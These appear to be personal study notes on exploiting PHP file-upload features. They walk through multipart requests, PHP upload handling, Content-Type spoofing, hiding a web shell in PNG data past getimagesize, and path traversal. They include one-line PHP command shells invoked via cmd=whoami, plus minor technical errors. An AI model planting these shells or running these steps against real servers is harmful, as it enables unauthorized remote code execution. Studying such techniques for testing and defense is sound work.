**Post Request To Upload a File**

Content-Type: multipart/form-data

- Boundary: how the upload is split up into it's various components.
- WebKitFormBoundary: `IMAGE/png`
- Filename attribute: name of the file you're trying to upload.
- Name: taken from the html form. Used by the browser.
- Data: actual bytes of the file.
- The boundary usual includes extra data at the end of the file, in this case it would be the `submit` and `level` of the POST request.

_If you have a server that is missing a web-page PNG, and it has an upload feature, you might be able to upload a malicious file with the same name and get the server to execute the code while trying to display it on the web=page._

**Reading PHP Code** 

PHP code to check the boundary:

```php
<?php

if (!isset($_POST['submit']) || !isset ($_POST['level1'])) {
	echo "<p> Request is not valid: </p>";
	exit()
}
```

- Checks to see if the submit value, and level1 is in the post request. If it isn't set it will echo the error `Request is not valid` at the the user.

PHP will save a file with a temporary name and then after it will decide what to do with it. This prevents an attacker from being able to easily guess what the file is called.

What does it save?
- Name -> string(5) "hi.png"
- Full Path -> string(5) "hi.png"
- Type -> string(9) "image/png"
- Tmp Name -> string(10) "/tmp/zlxqm"
- Error -> int(0)
- Size -> int(129481)

The server shouldn't show any of these details.

What is the basename?

`www.example.com/content/www/index.html`

In the above example the basename would be index.html.

PATHINFO_EXTENSION?

- Extracts the extension from the name: `.html` or `.png`
- Used to create a new string for `target_path`

Target_Path

- Writes the file to the server

Move_FIle

- Moves file saved in `tmp` to the target_path.
- Uses internal php function `move_upload_file`
- Move current path to target path.

Header

- Redirect to home page.

---

Simple PHP CMD shell:

```php
<?php system($_REQUEST['cmd']); ?>
```

```php
<?php system($_GET['cmd']); ?>
```

Navigate to uploaded file:

`www.example.com/uploads/myfile.php`

How to use:

```php
www.example.com/uploads/myfile.php?cmd=whoami
```

If you have control of the `filename` in the POST request, you can upload a php file directly to the server giving you RCE.

1. Control of DATA
2. Control of extension
3. Can you access the file? Does the server expose information in the response that provides the upload location.

Changing content type

`Content-Type: application/x-php`

- You can modify the request in burp proxy to change the request to whatever the application accepts:

`Content-Type: image/png`

If the php is suing get image size function:

`getimagesize`

- Tries to read the size of the file, and is it can't it will return an error.

Issues: 
1. You can hide the php shell inside a PNG file.

PNG files, in the first few bytes, include a lot of data, like the width and height, and other information about the file. An attacker would want to place the PHP shell further down in the data for it to be successful. 

Exploitation of getimagesize:

1. Upload the file, proxy the request, and then add the PHP shell to the image data.
2. Change the filename to php in the web form boundary.
3. Upload the file.
4. Navigate to the file and use:

```php
www.example.com/myfile.php?cmd=whoami
```

The server might be set up to deny php code to run on a specific folder, in that case you would need to use path traversal to try and put the file into a location that does run our PHP shell.

For example:

`filename="../../shell.php"`

- You would also have to use path traversal to access the file after it's been uploaded. 

`www.example.com/profile/avatar/../../shell.php?cmd=whoami`

---

1. What type of file can i upload?
2. What control do i have? 
3. Can i access the uploaded file?
4. Do i know the full path?
5. Can i control the file extension










 




